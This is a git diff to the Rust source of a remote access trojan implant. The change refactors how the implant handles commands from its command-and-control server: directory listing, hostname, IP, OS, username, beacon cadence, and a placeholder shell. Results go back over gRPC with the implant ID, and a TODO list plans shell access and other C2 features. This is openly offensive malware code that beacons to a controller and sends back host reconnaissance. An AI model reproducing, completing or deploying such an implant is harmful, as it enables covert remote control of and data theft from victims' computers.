@@ -12,9 +12,7 @@ use tonic::transport::Endpoint;
 /*
 Some outstanding things to do
     - client --> server help print
-    - server --> implant beacon cadence changing RatCommand
     - server --> implant drop into shell
-    - beacons should only pull / run most recent commands
     - log results of commands on the server
     - create a client to send commands to the server
     - client get results of commands from server
@@ -174,68 +172,28 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("{command}");
 
         let command = RatCommand::from_i32(response.command).unwrap();
-        let result = match command {
+        let command_result = match command {
             RatCommand::Cadence => {
                 state.command_number += 1;
                 let seconds = response.arguments.parse::<u64>()?;
                 state.cadence = Duration::from_millis(seconds * 1000);
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: format!("Beacon cadence changed")
-                    },
-                )
+                format!("Beacon cadence changed")
             },
             RatCommand::Dir => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: get_directory_listing()
-                    },
-                )
+                get_directory_listing()
             },
             RatCommand::Hostname => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: get_hostname()
-                    },
-                )
+                get_hostname()
             },
             RatCommand::Ip => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: get_ip_address()
-                    },
-                )
+                get_ip_address()
             },
             RatCommand::Ls => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: get_directory_listing()
-                    },
-                )
+                get_directory_listing()
             },
             RatCommand::None => {
                 mem::drop(channel);
@@ -246,15 +204,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             },
             RatCommand::Os => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: get_operating_system()
-                    },
-                )
+                get_operating_system()
             },
             RatCommand::Quit => {
                 state.command_number += 1;
@@ -262,43 +212,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             },
             RatCommand::Shell => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: "PLACEHOLDER".to_string()
-                    },
-                )
+                "PLACEHOLDER".to_string()
             },
             RatCommand::Whoami => {
                 state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: get_username()
-                    },
-                )
-            },
-            _ => {
-                state.command_number += 1;
-                tonic::Request::new(
-                    CommandResponse {
-                        implant_id: state.implant_id.clone(),
-                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                        command: response.command,
-                        arguments: response.arguments,
-                        result: "Command received from server not implemented".to_string()
-                    },
-                )
+                get_username()
             }
         };
+        let result = tonic::Request::new(
+            CommandResponse {
+                implant_id: state.implant_id.clone(),
+                timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                command: response.command,
+                arguments: response.arguments,
+                result: command_result
+            },
+        );
         response_client.send(result).await?;
-        // By dropping these I can prevent having an always-established channel
+        // By dropping these I can prevent having an always-established TCP session
         mem::drop(channel);
         mem::drop(ask_client);
         mem::drop(response_client);
